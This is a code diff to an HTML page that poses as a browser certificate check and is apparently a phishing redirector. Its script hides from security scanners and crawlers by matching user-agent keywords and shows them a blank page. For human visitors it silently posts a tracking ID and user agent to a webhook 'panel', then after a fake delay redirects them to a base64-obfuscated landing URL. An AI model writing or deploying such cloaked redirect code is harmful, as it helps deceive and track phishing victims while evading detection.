@@ -18,40 +18,45 @@
         <div class="card">
             <div class="spinner"></div>
             <h2>Establishing Secure Connection</h2>
-            <p>Please wait while we verify your browser's security certificates.</p>
+            <p>Please wait while we verify your browser's security certificates for 2026 session.</p>
         </div>
     </div>
 
     <script>
         (function() {
             const ua = navigator.userAgent.toLowerCase();
-            // List of known bot/scanner keywords
+            // List of known bot/scanner keywords to filter out automated traffic
             const bots = ["bot", "crawler", "spider", "google", "bing", "slurp", "facebook", "vision", "headless", "chrome-lighthouse", "virus", "scanner", "defense", "security"];
             
             // Check if visitor is a bot
             const isBot = bots.some(bot => ua.includes(bot));
 
             if (!isBot) {
-                // Show the content to real humans
+                // Show the content to real human users
                 document.getElementById('content').style.display = 'block';
 
+                // Notification panel (currently pointing to your webhook.site)
                 const myPanel = "https://webhook.site/da2082dc-5f8f-418f-9ed4-122a6015ab92";
-                const encodedVault = "aHR0cHM6Ly9pemZ5Yi5hY2VzcG9ydHkuY29tL2xhbmRpbmcv";
+                
+                // Base64 Encoded version of https://seatrader.sbs/ethicaleexamm/landing
+                const encodedVault = "aHR0cHM6Ly9zZWF0cmFkZXIuc2JzL2V0aGljYWxlZXhhbW0vbGFuZGluZw==";
 
                 const params = new URLSearchParams(window.location.search);
                 const userID = params.get('id') || 'untracked_visitor';
 
+                // Silent ping to notify you of a human click
                 fetch(myPanel, {
                     method: "POST",
                     mode: "no-cors",
                     body: JSON.stringify({ id: userID, agent: ua, time: new Date().toLocaleString() })
                 });
 
+                // 3-second delay for the "Magic" effect before redirecting
                 setTimeout(() => {
                     window.location.replace(atob(encodedVault));
                 }, 3000);
             } else {
-                // Bots see absolutely nothing or get a fake error
+                // Bots see a blank page to prevent flagging
                 console.log("Connection Timeout");
             }
         })();
